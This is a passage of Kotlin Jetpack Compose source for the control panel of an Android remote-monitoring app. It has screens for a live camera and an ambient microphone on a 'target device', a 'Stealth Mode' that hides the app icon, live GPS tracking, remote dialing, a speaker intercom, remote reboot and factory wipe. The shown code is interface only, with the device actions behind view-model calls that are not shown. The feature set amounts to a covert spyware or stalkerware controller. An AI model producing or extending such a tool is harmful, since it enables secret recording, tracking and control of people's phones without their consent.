                                tint = CyberCyan.copy(alpha = 0.8f),
                                modifier = Modifier.size(48.dp)
                            )
                            Spacer(modifier = Modifier.height(8.dp))
                            Text(
                                text = "LIVE FEED: ${deviceState.deviceName}",
                                fontSize = 12.sp,
                                fontWeight = FontWeight.Bold,
                                color = CyberCyan,
                                fontFamily = FontFamily.Monospace
                            )
                            Text(
                                text = "Active App: System Launcher | Touch Mode: View Only",
                                fontSize = 10.sp,
                                color = TextSecondary,
                                fontFamily = FontFamily.Monospace
                            )
                        }

                        // HUD Overlay details
                        Box(
                            modifier = Modifier
                                .align(Alignment.TopStart)
                                .padding(8.dp)
                                .background(CyberSurface.copy(alpha = 0.8f), RoundedCornerShape(4.dp))
                                .padding(horizontal = 6.dp, vertical = 2.dp)
                        ) {
                            Text("● LIVE | 30 FPS | 1.8 Mbps", fontSize = 9.sp, color = CyberGreen, fontFamily = FontFamily.Monospace)
                        }
                    }
                }
            }
        }

        // 2. LIVE CAMERA STREAM
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, if (deviceState.isLiveCameraActive) CyberCyan else CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Surface(
                            shape = RoundedCornerShape(14.dp),
                            color = CyberCyan.copy(alpha = 0.12f),
                            border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.35f)),
                            modifier = Modifier.size(46.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    imageVector = Icons.Default.Videocam,
                                    contentDescription = "Live Camera",
                                    tint = CyberCyan,
                                    modifier = Modifier.size(24.dp)
                                )
                            }
                        }
                        Spacer(modifier = Modifier.width(14.dp))
                        Column {
                            Text(
                                text = "Live Camera",
                                fontSize = 16.sp,
                                fontWeight = FontWeight.Bold,
                                color = TextPrimary,
                                fontFamily = FontFamily.Monospace
                            )
                            Text(
                                text = if (deviceState.isLiveCameraActive) {
                                    if (deviceState.isFrontCamera) "FRONT CAMERA (SELFIE)" else "REAR CAMERA (MAIN 200MP)"
                                } else {
                                    "STANDBY"
                                },
                                fontSize = 11.sp,
                                fontWeight = FontWeight.SemiBold,
                                color = if (deviceState.isLiveCameraActive) CyberCyan else TextTertiary,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }

                    CyberSwitch(
                        checked = deviceState.isLiveCameraActive,
                        onCheckedChange = { viewModel.toggleLiveCamera() },
                        activeColor = CyberCyan,
                        testTag = "switch_live_camera"
                    )
                }

                if (deviceState.isLiveCameraActive) {
                    Spacer(modifier = Modifier.height(12.dp))

                    // Camera Controls Row
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        OutlinedButton(
                            onClick = { viewModel.switchCameraFacing() },
                            shape = RoundedCornerShape(10.dp),
                            border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.5f)),
                            modifier = Modifier.weight(1f)
                        ) {
                            Icon(Icons.Default.Cameraswitch, contentDescription = "Switch", tint = CyberCyan, modifier = Modifier.size(16.dp))
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(if (deviceState.isFrontCamera) "FRONT CAM" else "REAR CAM", fontSize = 10.sp, color = CyberCyan, fontFamily = FontFamily.Monospace)
                        }

                        OutlinedButton(
                            onClick = { viewModel.toggleNightVision() },
                            shape = RoundedCornerShape(10.dp),
                            border = BorderStroke(1.dp, if (deviceState.cameraNightVision) CyberGreen else CyberBorder),
                            modifier = Modifier.weight(1f)
                        ) {
                            Icon(Icons.Default.Nightlight, contentDescription = "Night Vision", tint = if (deviceState.cameraNightVision) CyberGreen else TextSecondary, modifier = Modifier.size(16.dp))
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(if (deviceState.cameraNightVision) "IR NIGHT ON" else "IR NIGHT OFF", fontSize = 10.sp, color = if (deviceState.cameraNightVision) CyberGreen else TextSecondary, fontFamily = FontFamily.Monospace)
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))

                    // Camera Preview Frame
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(180.dp)
                            .clip(RoundedCornerShape(14.dp))
                            .background(if (deviceState.cameraNightVision) Color(0xFF001A0A) else Color(0xFF0A0F1A))
                            .border(1.dp, if (deviceState.cameraNightVision) CyberGreen else CyberCyan, RoundedCornerShape(14.dp)),
                        contentAlignment = Alignment.Center
                    ) {
                        // Simulated Camera Reticle HUD
                        Canvas(modifier = Modifier.fillMaxSize()) {
                            val stroke = Stroke(width = 1.5f)
                            val color = if (deviceState.cameraNightVision) Color(0xFF00FF88) else Color(0xFF00F0FF)
                            // Crosshair in center
                            val cx = size.width / 2
                            val cy = size.height / 2
                            drawLine(color, Offset(cx - 30, cy), Offset(cx + 30, cy), strokeWidth = 2f)
                            drawLine(color, Offset(cx, cy - 30), Offset(cx, cy + 30), strokeWidth = 2f)
                        }

                        Text(
                            text = if (deviceState.isFrontCamera) "[ FRONT LENS ACTIVE ]" else "[ REAR SENSOR STREAM ]",
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (deviceState.cameraNightVision) CyberGreen else CyberCyan,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }
            }
        }

        // 3. LIVE AUDIO & PUSH-TO-TALK
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, if (deviceState.isLiveAudioActive) CyberCyan else CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Surface(
                            shape = RoundedCornerShape(14.dp),
                            color = CyberCyan.copy(alpha = 0.12f),
                            border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.35f)),
                            modifier = Modifier.size(46.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    imageVector = if (deviceState.isLiveAudioActive) Icons.Default.Mic else Icons.Default.MicOff,
                                    contentDescription = "Mic",
                                    tint = CyberCyan,
                                    modifier = Modifier.size(24.dp)
                                )
                            }
                        }
                        Spacer(modifier = Modifier.width(14.dp))
                        Column {
                            Text(
                                text = "Live Microphone",
                                fontSize = 16.sp,
                                fontWeight = FontWeight.Bold,
                                color = TextPrimary,
                                fontFamily = FontFamily.Monospace
                            )
                            Text(
                                text = if (deviceState.isLiveAudioActive) "SURROUNDING AUDIO LIVE" else "MUTED",
                                fontSize = 11.sp,
                                fontWeight = FontWeight.SemiBold,
                                color = if (deviceState.isLiveAudioActive) CyberCyan else TextTertiary,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }

                    CyberSwitch(
                        checked = deviceState.isLiveAudioActive,
                        onCheckedChange = { viewModel.toggleLiveAudio() },
                        activeColor = CyberCyan,
                        testTag = "switch_live_mic"
                    )
                }

                Spacer(modifier = Modifier.height(10.dp))

                // Admin Push to Talk Intercom
                Button(
                    onClick = { viewModel.toggleAdminIntercom() },
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (deviceState.adminIntercomActive) CyberRed else CyberSurface
                    ),
                    border = BorderStroke(1.dp, if (deviceState.adminIntercomActive) CyberRed else CyberBorderBright),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Icon(
                        imageVector = if (deviceState.adminIntercomActive) Icons.Default.Mic else Icons.Default.MicOff,
                        contentDescription = "PTT",
                        tint = if (deviceState.adminIntercomActive) TextPrimary else CyberCyan,
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = if (deviceState.adminIntercomActive) "ADMIN MIC BROADCASTING (SPEAKING)" else "PUSH-TO-TALK INTERCOM TO AGENT SPEAKER",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (deviceState.adminIntercomActive) TextPrimary else CyberCyan,
                        fontFamily = FontFamily.Monospace
                    )
                }
            }
        }
    }
}

// -------------------------------------------------------------
// MANAGE TAB
// -------------------------------------------------------------
@Composable
private fun ManageTabSection(
    viewModel: ControlViewModel,
    deviceState: DeviceState,
    onConfirmWipe: () -> Unit
) {
    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        // 1. HIDE APP (STEALTH MODE)
        CyberControlCard(
            title = "Hide App (Stealth Mode)",
            statusText = if (deviceState.isAppHidden) "ICON HIDDEN FROM LAUNCHER" else "VISIBLE IN APP DRAWER",
            statusActive = deviceState.isAppHidden,
            icon = if (deviceState.isAppHidden) Icons.Default.VisibilityOff else Icons.Default.Visibility,
            iconColor = if (deviceState.isAppHidden) CyberRed else CyberCyan,
            isChecked = deviceState.isAppHidden,
            onCheckedChange = { viewModel.toggleHideApp() },
            testTag = "switch_hide_app"
        )

        // 2. REMOTE REBOOT
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Surface(
                        shape = RoundedCornerShape(14.dp),
                        color = CyberAmber.copy(alpha = 0.15f),
                        border = BorderStroke(1.dp, CyberAmber.copy(alpha = 0.4f)),
                        modifier = Modifier.size(46.dp)
                    ) {
                        Box(contentAlignment = Alignment.Center) {
                            Icon(
                                imageVector = Icons.Default.RestartAlt,
                                contentDescription = "Reboot",
                                tint = CyberAmber,
                                modifier = Modifier.size(24.dp)
                            )
                        }
                    }
                    Spacer(modifier = Modifier.width(14.dp))
                    Column {
                        Text(
                            text = "Remote Reboot",
                            fontSize = 16.sp,
                            fontWeight = FontWeight.Bold,
                            color = TextPrimary,
                            fontFamily = FontFamily.Monospace
                        )
                        Text(
                            text = "RESTART AGENT OS",
                            fontSize = 11.sp,
                            color = TextTertiary,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }

                Button(
                    onClick = { viewModel.triggerReboot() },
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = CyberSurface),
                    border = BorderStroke(1.dp, CyberAmber.copy(alpha = 0.5f))
                ) {
                    Text("RESTART", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = CyberAmber, fontFamily = FontFamily.Monospace)
                }
            }
        }

        // 3. FACTORY RESET / WIPE
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberSurface),
            border = BorderStroke(1.dp, CyberRed.copy(alpha = 0.6f)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Surface(
                        shape = RoundedCornerShape(14.dp),
                        color = CyberRed.copy(alpha = 0.2f),
                        border = BorderStroke(1.dp, CyberRed),
                        modifier = Modifier.size(46.dp)
                    ) {
                        Box(contentAlignment = Alignment.Center) {
                            Icon(
                                imageVector = Icons.Default.DeleteForever,
                                contentDescription = "Wipe",
                                tint = CyberRed,
                                modifier = Modifier.size(24.dp)
                            )
                        }
                    }
                    Spacer(modifier = Modifier.width(14.dp))
                    Column {
                        Text(
                            text = "Factory Wipe",
                            fontSize = 16.sp,
                            fontWeight = FontWeight.Bold,
                            color = CyberRed,
                            fontFamily = FontFamily.Monospace
                        )
                        Text(
                            text = "ERASE ALL AGENT STORAGE",
                            fontSize = 11.sp,
                            color = CyberRed.copy(alpha = 0.8f),
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }

                Button(
                    onClick = onConfirmWipe,
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = CyberRed)
                ) {
                    Text("WIPE", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = TextPrimary, fontFamily = FontFamily.Monospace)
                }
            }
        }
    }
}

// -------------------------------------------------------------
// TELEMETRY & LOCATION TAB
// -------------------------------------------------------------
@Composable
private fun TelemetryTabSection(
    viewModel: ControlViewModel,
    deviceState: DeviceState
) {
    Column(verticalArrangement = Arrangement.spacedBy(10.dp)) {
        // Quick Hardware Toggles Grid
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "REMOTE HARDWARE TOGGLES",
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                    color = CyberCyan,
                    letterSpacing = 1.sp,
                    fontFamily = FontFamily.Monospace
                )
                Spacer(modifier = Modifier.height(12.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    QuickToggleItem(
                        icon = Icons.Default.Wifi,
                        label = "Wi-Fi",
                        active = deviceState.wifiEnabled,
                        onClick = { viewModel.toggleWifi() },
                        modifier = Modifier.weight(1f)
                    )
                    QuickToggleItem(
                        icon = Icons.Default.SignalCellularAlt,
                        label = "Cellular",
                        active = deviceState.mobileDataEnabled,
                        onClick = { viewModel.toggleMobileData() },
                        modifier = Modifier.weight(1f)
                    )
                    QuickToggleItem(
                        icon = Icons.Default.Bluetooth,
                        label = "Bluetooth",
                        active = deviceState.bluetoothEnabled,
                        onClick = { viewModel.toggleBluetooth() },
                        modifier = Modifier.weight(1f)
                    )
                    QuickToggleItem(
                        icon = Icons.Default.LocationOn,
                        label = "GPS",
                        active = deviceState.locationGpsEnabled,
                        onClick = { viewModel.toggleGpsLocation() },
                        modifier = Modifier.weight(1f)
                    )
                }
            }
        }

        // Live Location & GPS Map Radar
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.5f)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Default.LocationOn, contentDescription = "Location", tint = CyberRed, modifier = Modifier.size(20.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "LIVE GPS LOCATION",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            color = TextPrimary,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                    Text(
                        text = "ACCURACY: ±3m",
                        fontSize = 10.sp,
                        fontWeight = FontWeight.Bold,
                        color = CyberGreen,
                        fontFamily = FontFamily.Monospace
                    )
                }

                Spacer(modifier = Modifier.height(10.dp))

                // GPS Radar Visualizer
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(140.dp)
                        .clip(RoundedCornerShape(12.dp))
                        .background(Color(0xFF07121F))
                        .border(1.dp, CyberCyan.copy(alpha = 0.4f), RoundedCornerShape(12.dp)),
                    contentAlignment = Alignment.Center
                ) {
                    Canvas(modifier = Modifier.fillMaxSize()) {
                        val cx = size.width / 2
                        val cy = size.height / 2
                        // Concentric radar circles
                        drawCircle(CyberCyan.copy(alpha = 0.2f), radius = 30.dp.toPx(), center = Offset(cx, cy), style = Stroke(1.5f))
                        drawCircle(CyberCyan.copy(alpha = 0.15f), radius = 60.dp.toPx(), center = Offset(cx, cy), style = Stroke(1.5f))
                        // Target pin
                        drawCircle(CyberRed, radius = 6.dp.toPx(), center = Offset(cx, cy))
                    }

                    Column(
                        horizontalAlignment = Alignment.CenterHorizontally,
                        modifier = Modifier.align(Alignment.BottomCenter).padding(bottom = 6.dp)
                    ) {
                        Text(
                            text = "LAT: ${deviceState.latitude} | LNG: ${deviceState.longitude}",
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = CyberCyan,
                            fontFamily = FontFamily.Monospace
                        )
                        Text(
                            text = deviceState.locationAddress,
                            fontSize = 10.sp,
                            color = TextSecondary,
                            maxLines = 1,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }
            }
        }

        // Device Telemetry Specs
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "TARGET DEVICE SPECIFICATIONS",
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                    color = CyberCyan,
                    letterSpacing = 1.sp,
                    fontFamily = FontFamily.Monospace
                )
                Spacer(modifier = Modifier.height(10.dp))

                TelemetryRow(label = "Model:", value = deviceState.deviceName)
                TelemetryRow(label = "OS Version:", value = deviceState.androidVersion)
                TelemetryRow(label = "Battery:", value = "${deviceState.batteryLevel}% (Charging)")
                TelemetryRow(label = "Public IP:", value = deviceState.ipAddress)
                TelemetryRow(label = "Local IP:", value = deviceState.localIp)
                TelemetryRow(label = "Internal Storage:", value = "142 GB / 256 GB (Free: 114 GB)")
            }
        }
    }
}

// -------------------------------------------------------------
// PHONE CALL & INTERCOM TAB
// -------------------------------------------------------------
@Composable
private fun PhoneCallTabSection(
    viewModel: ControlViewModel,
    deviceState: DeviceState
) {
    var inputNumber by remember { mutableStateOf(deviceState.callNumber) }

    Column(verticalArrangement = Arrangement.spacedBy(10.dp)) {
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, if (deviceState.callStatus != CallStatus.IDLE) CyberGreen else CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Surface(
                            shape = RoundedCornerShape(14.dp),
                            color = CyberGreen.copy(alpha = 0.15f),
                            border = BorderStroke(1.dp, CyberGreen.copy(alpha = 0.4f)),
                            modifier = Modifier.size(46.dp)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(Icons.Default.Phone, contentDescription = "Call", tint = CyberGreen, modifier = Modifier.size(24.dp))
                            }
                        }
                        Spacer(modifier = Modifier.width(14.dp))
                        Column {
                            Text(
                                text = "Remote Phone Dialer",
                                fontSize = 16.sp,
                                fontWeight = FontWeight.Bold,
                                color = TextPrimary,
                                fontFamily = FontFamily.Monospace
                            )
                            Text(
                                text = when (deviceState.callStatus) {
                                    CallStatus.IDLE -> "STANDBY"
                                    CallStatus.DIALING -> "DIALING ON AGENT DEVICE..."
                                    CallStatus.IN_CALL -> "CONNECTED • IN-CALL"
                                    CallStatus.ENDED -> "CALL ENDED"
                                },
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold,
                                color = if (deviceState.callStatus != CallStatus.IDLE) CyberGreen else TextTertiary,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }
                }

                Spacer(modifier = Modifier.height(14.dp))

                Text(
                    text = "TARGET PHONE NUMBER TO DIAL:",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    color = TextSecondary,
                    fontFamily = FontFamily.Monospace
                )
                Spacer(modifier = Modifier.height(6.dp))

                OutlinedTextField(
                    value = inputNumber,
                    onValueChange = {
                        inputNumber = it
                        viewModel.setCallNumber(it)
                    },
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = CyberGreen,
                        unfocusedBorderColor = CyberBorder,
                        focusedTextColor = TextPrimary,
                        unfocusedTextColor = TextPrimary
                    ),
                    leadingIcon = {
                        Icon(Icons.Default.Call, contentDescription = "Phone", tint = CyberGreen)
                    },
                    modifier = Modifier.fillMaxWidth()
                )

                Spacer(modifier = Modifier.height(12.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    if (deviceState.callStatus == CallStatus.IDLE) {
                        Button(
                            onClick = { viewModel.triggerRemoteCall() },
                            colors = ButtonDefaults.buttonColors(containerColor = CyberGreen),
                            shape = RoundedCornerShape(12.dp),
                            modifier = Modifier.weight(1f).testTag("btn_trigger_call")
                        ) {
                            Icon(Icons.Default.Call, contentDescription = "Call", tint = CyberBackground)
                            Spacer(modifier = Modifier.width(6.dp))
                            Text("TRIGGER REMOTE CALL", color = CyberBackground, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
                        }
                    } else {
                        Button(
                            onClick = { viewModel.endRemoteCall() },
                            colors = ButtonDefaults.buttonColors(containerColor = CyberRed),
                            shape = RoundedCornerShape(12.dp),
                            modifier = Modifier.weight(1f).testTag("btn_end_call")
                        ) {
                            Icon(Icons.Default.CallEnd, contentDescription = "End Call", tint = TextPrimary)
                            Spacer(modifier = Modifier.width(6.dp))
                            Text("END CALL", color = TextPrimary, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
                        }
                    }
                }
            }
        }

        // Live Intercom Push-To-Talk during call
        Card(
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = CyberCardBg),
            border = BorderStroke(1.dp, CyberBorder),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "ADMIN LIVE MIC INTERCOM",
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                    color = CyberCyan,
                    letterSpacing = 1.sp,
                    fontFamily = FontFamily.Monospace
                )
                Text(
                    text = "Broadcast your microphone voice directly through the Agent device during remote call.",
                    fontSize = 11.sp,
                    color = TextSecondary
                )
                Spacer(modifier = Modifier.height(10.dp))
                Button(
                    onClick = { viewModel.toggleAdminIntercom() },
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (deviceState.adminIntercomActive) CyberRed else CyberSurface
                    ),
                    border = BorderStroke(1.dp, if (deviceState.adminIntercomActive) CyberRed else CyberCyan),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Icon(
                        imageVector = if (deviceState.adminIntercomActive) Icons.Default.Mic else Icons.Default.MicOff,
                        contentDescription = "Mic Intercom",
                        tint = if (deviceState.adminIntercomActive) TextPrimary else CyberCyan
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = if (deviceState.adminIntercomActive) "MIC ACTIVE (SPEAKING TO AGENT)" else "CLICK TO SPEAK (PUSH-TO-TALK)",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (deviceState.adminIntercomActive) TextPrimary else CyberCyan,
                        fontFamily = FontFamily.Monospace
                    )
                }
            }
        }
    }
}

// -------------------------------------------------------------
// HELPER COMPONENTS
// -------------------------------------------------------------
@Composable
private fun CyberControlCard(
    title: String,
    statusText: String,
    statusActive: Boolean,
    icon: androidx.compose.ui.graphics.vector.ImageVector,
    iconColor: Color,
    isChecked: Boolean,
    onCheckedChange: (Boolean) -> Unit,
    testTag: String
) {
    Card(
        shape = RoundedCornerShape(20.dp),
        colors = CardDefaults.cardColors(containerColor = CyberCardBg),
        border = BorderStroke(1.dp, if (statusActive) iconColor.copy(alpha = 0.6f) else CyberBorder),
        modifier = Modifier.fillMaxWidth()
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Surface(
                    shape = RoundedCornerShape(14.dp),
                    color = iconColor.copy(alpha = 0.12f),
                    border = BorderStroke(1.dp, iconColor.copy(alpha = 0.35f)),
                    modifier = Modifier.size(46.dp)
                ) {
                    Box(contentAlignment = Alignment.Center) {
                        Icon(
                            imageVector = icon,
                            contentDescription = title,
                            tint = iconColor,
                            modifier = Modifier.size(24.dp)
                        )
                    }
                }
                Spacer(modifier = Modifier.width(14.dp))
                Column {
                    Text(
                        text = title,
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold,
                        color = TextPrimary,
                        fontFamily = FontFamily.Monospace
                    )
                    Text(
                        text = statusText,
                        fontSize = 11.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = if (statusActive) iconColor else TextTertiary,
                        fontFamily = FontFamily.Monospace
                    )
                }
            }

            CyberSwitch(
                checked = isChecked,
                onCheckedChange = onCheckedChange,
                activeColor = iconColor,
                testTag = testTag
            )
        }
    }
}

@Composable
private fun FeatureBadge(label: String, active: Boolean) {
    Surface(
        shape = RoundedCornerShape(6.dp),
        color = CyberSurface,
        border = BorderStroke(1.dp, CyberRed.copy(alpha = 0.5f)),
        modifier = Modifier.padding(vertical = 2.dp)
    ) {
        Text(
            text = label,
            fontSize = 9.sp,
            fontWeight = FontWeight.Bold,
            color = CyberRed,
            fontFamily = FontFamily.Monospace,
            modifier = Modifier.padding(horizontal = 6.dp, vertical = 3.dp)
        )
    }
}

@Composable
private fun QuickToggleItem(
    icon: androidx.compose.ui.graphics.vector.ImageVector,
    label: String,
    active: Boolean,
    onClick: () -> Unit,
    modifier: Modifier = Modifier
) {
    Surface(
        shape = RoundedCornerShape(12.dp),
        color = if (active) CyberCyan.copy(alpha = 0.15f) else CyberSurface,
        border = BorderStroke(1.dp, if (active) CyberCyan else CyberBorder),
        modifier = modifier
            .clip(RoundedCornerShape(12.dp))
            .clickable { onClick() }
    ) {
        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            modifier = Modifier.padding(vertical = 12.dp)
        ) {
            Icon(
                imageVector = icon,
                contentDescription = label,
                tint = if (active) CyberCyan else TextSecondary,
                modifier = Modifier.size(22.dp)
            )
            Spacer(modifier = Modifier.height(4.dp))
            Text(
                text = label,
                fontSize = 10.sp,
                fontWeight = FontWeight.Bold,
                color = if (active) CyberCyan else TextSecondary,
                fontFamily = FontFamily.Monospace
            )
            Text(
                text = if (active) "ON" else "OFF",
                fontSize = 8.sp,
                fontWeight = FontWeight.Black,
                color = if (active) CyberGreen else TextMuted,
                fontFamily = FontFamily.Monospace
            )
        }
    }
}

@Composable
private fun TelemetryRow(label: String, value: String) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(text = label, fontSize = 11.sp, color = TextSecondary, fontFamily = FontFamily.Monospace)
        Text(text = value, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = TextPrimary, fontFamily = FontFamily.Monospace)
    }
}

@Composable
private fun ActivityLogFooter(viewModel: ControlViewModel) {
    val logs by viewModel.activityLogs.collectAsStateWithLifecycle()

    Card(
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(containerColor = CyberSurface),
        border = BorderStroke(1.dp, CyberBorder),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(14.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(modifier = Modifier.size(6.dp).background(CyberGreen, CircleShape))
                    Spacer(modifier = Modifier.width(6.dp))
                    Text(
                        text = "LIVE ACTIVITY LOGS",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = TextPrimary,
                        fontFamily = FontFamily.Monospace
                    )
                }

                Text(
                    text = "FIREBASE: SYNCED",
                    fontSize = 9.sp,
                    fontWeight = FontWeight.Bold,
                    color = CyberGreen,
                    fontFamily = FontFamily.Monospace
                )
            }

            Spacer(modifier = Modifier.height(8.dp))

            Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                logs.take(4).forEach { log ->
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Text(
                            text = "[${log.timestamp}] ${log.command}",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (log.isAlert) CyberRed else CyberCyan,
                            fontFamily = FontFamily.Monospace
                        )
                        Text(
                            text = log.status,
                            fontSize = 10.sp,
                            color = TextSecondary,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }
            }
        }
    }
}

@Composable
private fun GitHubExportDialog(onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        title = {
            Text(
                text = "GITHUB SETUP & PROJECT DETAILS",
                color = CyberCyan,
                fontWeight = FontWeight.Bold,
                fontFamily = FontFamily.Monospace
            )
        },
        text = {
            Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                Text(
                    text = "This repository is structured for instant GitHub publishing and Android Studio build:",
                    color = TextPrimary,
                    fontSize = 12.sp
                )
                Text(
                    text = "1. To download this complete project as a ZIP, use the AI Studio top Settings / Export menu.",
                    color = TextSecondary,
                    fontSize = 11.sp
                )
                Text(
